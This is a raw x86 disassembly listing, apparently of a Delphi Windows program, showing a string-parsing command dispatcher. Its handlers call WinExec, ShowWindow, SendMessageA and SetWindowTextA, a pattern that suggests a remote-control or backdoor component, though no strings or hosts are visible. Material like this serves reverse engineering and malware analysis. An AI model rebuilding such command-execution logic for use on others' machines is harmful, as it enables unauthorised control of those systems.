jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xb
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
push ebp
mov eax [ ebp - 0xc ]
call sub_409edc
lea edx [ ebp - 0x39c ]
call sub_46de04
mov eax [ ebp - 0x39c ]
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
call sub_475fd8
pop ecx
lea eax [ ebp - 0x3a8 ]
push eax
mov ecx 0x7
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x3a8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xb
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
mov eax [ ebp - 0x8 ]
call sub_409edc
mov esi eax
mov ebx esi
test ebx ebx
jle r-xdata
lea eax [ ebp - 0x3b0 ]
push eax
mov ecx 0xc
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x3b0 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x7
mov edx 0x1
call sub_405a84
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x1a8 ] eax
xor eax eax
push ebp
push sub_477dc6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1a8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax r-xdata
call sub_475e2c
mov edi 0x1
lea eax [ ebp - 0x3b4 ]
push eax
mov ecx 0x5
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x3b4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xc
mov edx 0x1
call sub_405a84
mov eax [ ebp - 0x8 ]
call sub_409edc
call sub_484388
mov eax r-xdata
call sub_475e2c
lea ecx [ ebp - 0x3ac ]
xor edx edx
mov eax [ ebp - 0x1a8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x3ac ]
call sub_409edc
call sub_484388
xor edx edx
mov eax [ ebp - 0x1a8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov eax [ ebp - 0x1a8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jne r-xdata
mov eax r-xdata
call sub_475e2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1a8 ]
call sub_404650
retn
mov eax [ ebp - 0xc ]
call sub_409edc
call sub_484388
lea eax [ ebp - 0x3a4 ]
push eax
mov edx [ ebp - 0xc ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_405a44
mov eax [ ebp - 0x3a4 ]
call sub_409edc
call sub_484388
mov edx [ ebp - 0xc ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0xc ]
mov edx 0x1
call sub_405a84
jmp r-xdata
lea eax [ ebp - 0x3c4 ]
push eax
mov ecx 0x5
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x3c4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x5
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
push ebp
lea ecx [ ebp - 0x3bc ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_46e9f8
push [ ebp - 0x3bc ]
push r-xdata
lea ecx [ ebp - 0x3c0 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_46eab8
push [ ebp - 0x3c0 ]
lea eax [ ebp - 0x3b8 ]
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0x3b8 ]
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
call sub_475fd8
pop ecx
cmp esi edi
je r-xdata
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x3c8 ]
push eax
mov ecx 0x5
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x3c8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x5
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
lea eax [ ebp - 0x8 ]
mov ecx 0x1
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_46e0dc
lea eax [ ebp - 0x3d4 ]
push eax
mov ecx 0x5
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x3d4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x5
mov edx 0x1
call sub_405a84
mov ebx [ ebp - 0x8 ]
test ebx ebx
je r-xdata
lea eax [ ebp - 0x3e0 ]
push eax
mov ecx 0x5
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x3e0 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x5
mov edx 0x1
call sub_405a84
mov ebx [ ebp - 0x8 ]
test ebx ebx
je r-xdata
lea eax [ ebp - 0x3cc ]
push eax
mov ecx ebx
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x3cc ]
push eax
lea eax [ ebp - 0x3d0 ]
push eax
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x3d0 ]
pop edx
call sub_46e244
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x3e4 ]
push eax
mov ecx 0x8
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x3e4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x5
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_46f064
lea eax [ ebp - 0x3d8 ]
push eax
mov ecx ebx
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x3d8 ]
push eax
lea eax [ ebp - 0x3dc ]
push eax
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x3dc ]
pop edx
call sub_46df5c
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x3e8 ]
push eax
mov ecx 0x11
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x3e8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x8
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_46ee98
lea eax [ ebp - 0x3ec ]
push eax
mov ecx 0x9
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x3ec ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x11
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_46ef80
lea eax [ ebp - 0x3fc ]
push eax
mov ecx 0x6
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x3fc ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x9
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x400 ]
push eax
mov ecx 0x8
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x400 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x6
mov edx 0x1
call sub_405a84
push 0x0
push 0x0
push 0x10
mov eax [ ebp - 0x8 ]
call sub_409edc
push eax
call SendMessageA
push ebp
lea eax [ ebp - 0x3f8 ]
call sub_46f390
mov eax [ ebp - 0x3f8 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
call sub_475fd8
pop ecx
push ebp
lea eax [ ebp - 0x3f0 ]
call sub_46f390
lea eax [ ebp - 0x3f0 ]
push eax
lea eax [ ebp - 0x3f4 ]
call sub_46f5bc
mov edx [ ebp - 0x3f4 ]
pop eax
call sub_405818
mov eax [ ebp - 0x3f0 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
call sub_475fd8
pop ecx
jmp r-xdata
lea eax [ ebp - 0x404 ]
push eax
mov ecx 0x8
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x404 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x8
mov edx 0x1
call sub_405a84
push 0x3
mov eax [ ebp - 0x8 ]
call sub_409edc
push eax
call ShowWindow
lea eax [ ebp - 0x408 ]
push eax
mov ecx 0x5
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x408 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x8
mov edx 0x1
call sub_405a84
push 0x6
mov eax [ ebp - 0x8 ]
call sub_409edc
push eax
call ShowWindow
lea eax [ ebp - 0x40c ]
push eax
mov ecx 0x5
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x40c ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x5
mov edx 0x1
call sub_405a84
push 0x0
mov eax [ ebp - 0x8 ]
call sub_409edc
push eax
call ShowWindow
lea eax [ ebp - 0x410 ]
push eax
mov ecx 0x10
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x410 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x5
mov edx 0x1
call sub_405a84
push 0x5
mov eax [ ebp - 0x8 ]
call sub_409edc
push eax
call ShowWindow
lea eax [ ebp - 0x414 ]
push eax
mov ecx 0xa
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x414 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x10
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov eax [ ebp - 0x10 ]
call sub_4059dc
push eax
mov eax [ ebp - 0xc ]
call sub_409edc
push eax
call SetWindowTextA
lea eax [ ebp - 0x41c ]
push eax
mov ecx 0x9
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x41c ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xa
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
push ebp
lea eax [ ebp - 0x418 ]
call sub_48a480
mov eax [ ebp - 0x418 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
call sub_475fd8
pop ecx
lea eax [ ebp - 0x420 ]
push eax
mov ecx 0x9
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x420 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x9
mov edx 0x1
call sub_405a84
mov eax [ ebp - 0x8 ]
call sub_48a72c
lea eax [ ebp - 0x424 ]
push eax
mov ecx 0xc
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x424 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x9
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_48a7e0
lea eax [ ebp - 0x428 ]
push eax
mov ecx 0xb
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x428 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xc
mov edx 0x1
call sub_405a84
push 0x5
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
call WinExec
lea eax [ ebp - 0x430 ]
push eax
mov ecx 0xd
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x430 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xb
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
push ebp
lea eax [ ebp - 0x42c ]
call sub_471640
mov eax [ ebp - 0x42c ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
call sub_475fd8
pop ecx
lea eax [ ebp - 0x438 ]
push eax
mov ecx 0xc
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x438 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xd
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x434 ]
call sub_46d9e0
mov eax [ ebp - 0x434 ]
mov edx [ ebp - 0x8 ]
call sub_46dd38
lea eax [ ebp - 0x440 ]
push eax
mov ecx 0xe
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x440 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xc
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x43c ]
call sub_46d9e0
mov eax [ ebp - 0x43c ]
mov edx [ ebp - 0x8 ]
call sub_46dc70
lea eax [ ebp - 0x444 ]
push eax
mov ecx 0xe
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x444 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xe
mov edx 0x1
call sub_405a84
mov eax [ ebp - 0x8 ]
call sub_4715b0
lea eax [ ebp - 0x44c ]
push eax
mov ecx 0xe
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x44c ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xe
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov eax [ ebp - 0x14 ]
call sub_4059dc
mov edx eax
lea eax [ ebp - 0x448 ]
call sub_405728
mov eax [ ebp - 0x448 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4059dc
push eax
mov eax [ ebp - 0xc ]
call sub_4059dc
pop edx
pop ecx
call sub_471850
lea eax [ ebp - 0x454 ]
push eax
mov ecx 0x8
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x454 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xe
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
push ebp
lea eax [ ebp - 0x450 ]
call sub_46f744
mov eax [ ebp - 0x450 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
call sub_475fd8
pop ecx
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x8
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_4055c8
lea eax [ ebp - 0x14 ]
mov ecx 0x5
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov ecx 0x4
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_405a44
push r-xdata
push [ ebp - 0x14 ]
push r-xdata
lea eax [ ebp - 0x458 ]
mov edx 0x3
call sub_4058e0
mov edx [ ebp - 0x458 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_46ff10
lea eax [ ebp - 0x45c ]
push eax
mov ecx 0xb
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x45c ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_46fff0
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xb
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_484fc0
